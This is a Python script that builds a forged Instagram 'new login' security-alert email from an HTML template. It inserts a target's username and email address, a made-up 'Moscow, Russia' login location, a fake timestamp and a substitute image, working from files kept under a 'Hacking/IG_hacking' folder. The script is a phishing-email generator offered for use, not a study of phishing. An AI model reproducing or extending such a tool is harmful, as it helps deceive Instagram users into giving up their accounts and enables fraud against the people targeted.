from bs4 import BeautifulSoup , NavigableString
import os
import re
from ig_fake_time import ig_fake
from functools import reduce

class FakeEmail_pipeline:
    def __init__(self,soup:BeautifulSoup,target_id:str,fake_img:str,target_email:str,save_path:str) -> None:
        self.soup = soup
        self.target_id = target_id
        self.fake_img = fake_img
        self.target_email = target_email
        self.save_path = save_path
    
    def target_td_id(self,) -> None:
        target_td_id = self.soup.find('td', style=re.compile(r'width:300px;padding:0;margin:0;text-align:center;color:#262626;font-size:18px;font-family:Helvetica Neue,Helvetica,Roboto,Arial,sans-serif'))
        target_td_id_new_text = f"{self.target_id}，我們注意到新的登入"
        target_td_id.clear()
        target_td_id.append(target_td_id_new_text)
        
    
    def td_system_and_gps(self,) -> None:
        td_system_and_gps = self.soup.find('td',style=re.compile(r'width:300px;padding:0;margin:0;text-align:center;color:#262626;font-size:16px;font-family:Helvetica Neue,Helvetica,Roboto,Arial,sans-serif'))
        fake_gps = "Moscow, Russia"
        fake_system_gps = f"Windows · Chrome · {fake_gps}"
        td_system_and_gps.clear()
        td_system_and_gps.append(fake_system_gps)

    def _fake_time(self,) -> None:
        _fake_time = self.soup.find('td',style=re.compile(r'width:300px;padding:0;margin:0;text-align:center;color:#999999;font-size:14px;font-family:Helvetica Neue,Helvetica,Roboto,Arial,sans-serif'),align="center")
        _fake_time.clear()
        fake_time = ig_fake()
        _fake_time.append(fake_time)

    def _img(self,) -> None:
        _img = self.soup.find('img',style=re.compile(r'border:0px.*vertical-align:middle'),class_="CToWUd")
        _img['src']=self.fake_img

    def target_fake_email(self,) -> None:
        target_fake_email = self.soup.find('a',style=re.compile(r'color:#abadae;text-decoration:underline'))
        target_fake_email.clear()
        target_fake_email.append(self.target_email)

    def target_divs_name(self) -> None:
        divs = self.soup.find_all('div', style=re.compile(r'color:#abadae;font-size:11px'))
        for div in divs:
            if '此訊息已發送至' in div.text:
                self.process_div_contents(div)

    def process_div_contents(self, div) -> None:
        for content in div.contents:
            if self.is_target_content(content):
                self.replace_content(content)

    def is_target_content(self, content) -> bool:
        return isinstance(content, NavigableString) and '收件人為' in content

    def replace_content(self, content) -> None:
        parts = content.split('收件人為 ')
        if len(parts) > 1:
            sub_parts = parts[1].split(' 。這不是你的帳戶？請從此帳戶', 1)
            if len(sub_parts) > 1:
                new_string = parts[0] + '收件人為 ' + self.target_id + ' 。這不是你的帳戶？請從此帳戶' + sub_parts[1]
                content.replace_with(new_string)

        
    def save(self) -> None:
        with open(self.save_path, "w+", encoding="utf-8") as modified_file:
            modified_file.write(self.soup.prettify())
        print("write successful")
  
    def pipeline(self):
        self.target_td_id()
        self.td_system_and_gps()
        self._fake_time()
        self._img()
        self.target_fake_email()
        self.target_divs_name()
        self.save()

def main():
    target_id = ""
    target_email = ""
    fake_img = ""
    html_soup = "Hacking/IG_hacking/blueprint/ig_erro_blueprint.html" 
    with open(html_soup, "r", encoding="utf-8") as file:
        soup = BeautifulSoup(file, 'html5lib')
    
    save_path = "Hacking/IG_hacking/***/ig_erro_modified.html"
    
    FE = FakeEmail_pipeline(soup=soup,target_id=target_id,target_email=target_email,fake_img=fake_img,save_path=save_path)
    FE.pipeline()
    

if __name__ == "__main__":
    main()